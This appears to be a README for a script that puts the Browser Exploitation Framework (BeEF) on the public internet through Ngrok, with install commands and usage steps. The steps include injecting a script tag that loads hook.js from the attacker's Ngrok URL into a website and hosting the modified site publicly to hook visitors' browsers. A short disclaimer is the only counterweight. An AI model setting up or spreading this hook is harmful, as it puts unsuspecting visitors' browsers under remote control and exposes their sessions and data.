# BeEF Over WAN (Automated Script)

## Description
The **BeEF Over WAN** script automates the setup of **BeEF (Browser Exploitation Framework)** over the internet using **Ngrok**. This allows security researchers to deploy BeEF outside the local network without complex port forwarding.

## Features
- **Automated BeEF Configuration** – Dynamically updates the BeEF `config.yaml` file.
- **Ngrok Integration** – Automatically sets up a public-facing URL.
- **Process Management** – Kills existing services on port 3000 before starting BeEF.
- **Multi-Terminal Support** – Detects available terminal emulators for execution.

## Installation

### Prerequisites
Ensure the following dependencies are installed before running the script:

1. **BeEF** – Download and install BeEF from GitHub:

```bash
git clone https://github.com/beefproject/beef.git
cd beef
./install
```

2. **Ngrok** – Download and configure Ngrok:

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin/
ngrok authtoken <YOUR_AUTH_TOKEN>
```

3. **jq** – Install jq for parsing JSON responses:

```bash
sudo apt install jq -y
```

## Usage
Run the script using:

```bash
bash beefoverwan.sh
```

### Steps:
1. The script will **start Ngrok** and retrieve a public URL.
2. It will **update BeEF’s config.yaml** file with the correct hostname.
3. **BeEF will launch**, making it accessible over the internet.
4. **Inject the BeEF hook** into a website by adding the following HTML snippet:

```html
<script src="http://<NGROK_URL>/hook.js"></script>
```

5. Host the modified website using **Zrok** or any public-facing web hosting service.

## Example Output
```
[+] Starting ngrok on port 3000...
[+] ngrok Host: abc123.ngrok.io
[+] Updating BeEF config.yaml...
[+] Starting BeEF...
[+] Setup complete! BeEF is running.
```

## Disclaimer
This tool is intended **for educational and security research purposes only**. Unauthorized usage against systems you do not own is **illegal and unethical**. The author is not responsible for any misuse of this tool.

## License
This project is released under the **MIT License**.
